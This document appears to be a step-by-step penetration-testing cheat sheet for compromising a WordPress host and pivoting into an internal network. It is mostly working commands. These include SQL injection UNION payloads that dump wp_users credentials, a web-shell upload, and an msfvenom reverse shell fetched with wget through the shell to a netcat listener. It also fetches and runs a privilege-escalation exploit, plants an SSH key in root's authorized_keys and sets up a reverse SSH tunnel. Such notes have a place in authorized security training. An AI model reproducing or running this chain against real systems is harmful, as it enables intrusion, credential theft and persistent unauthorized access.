##### example step by step to p0wn

Example Network:

[10.1.1.0] -> Firewall - DNS [helloworld.com]
[10.2.2.2] [22,80] web application
Client inside [10.3.3.3] [22,3305] -> Firewall
Client inside [10.3.3.4]
Client inside [10.3.3.5]
Domain Controller inside [10.3.3.6]

Access 10.1.1.0 via DNS name, as direct to IP goes to firewall page

```
sudo nmap -sC -sS -p0-65535 helloworld.com
```

Web Application
```
dirb http://helloworld.com
wpscan --url helloworld.com --enumerate ap,at,cb,dbe
burp
```

SQLI - obtain user creds
```
OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#
OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#
```

Upload plugin-shell
```
/usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
```

Create & upload payload
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f elf > shell.elf
sudo python -m SimpleHTTPServer 80
curl 'http://helloworld.com/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://$IP/shell.elf'
curl 'http://helloworld.com/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf'

sudo nc -vlnp $PORT
curl 'http://helloworld.com/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf

```

Priv Esc steps - find vulnerability & exploit

method\linux\1_quick_n_dirty_enum.md

```
cd ../../../../../tmp && wget http://$IP/exploit && chmod +x exploit && ./exploit
```

Create SSH Keys for tunnel
```
ssh-keygen
cat id_rsa.pub
# authorized keys
from="$IP",command="echo 'port forward only'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa QWERTY1234asd456....
sudo apt install openssh-client
sudo systemctl enable ssh
sudo systemctl start ssh
ssh-keygen
echo 'ssh-rsa AAAA= kali@kali' >> /root/.ssh/authorized_keys
```

Reverse Tunnel
On compromised host, forward port 22 on 10.3.3.3 to port 1122 and forward 3306 on 10.3.3.3 to port 13306
```
sudo netstat -tulpn
kill PID
ssh -f -N -R 1122:10.3.3.3:22 -R 13306:10.3.3.3:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/tmp/keys/id_rsa kali@$IP
```




































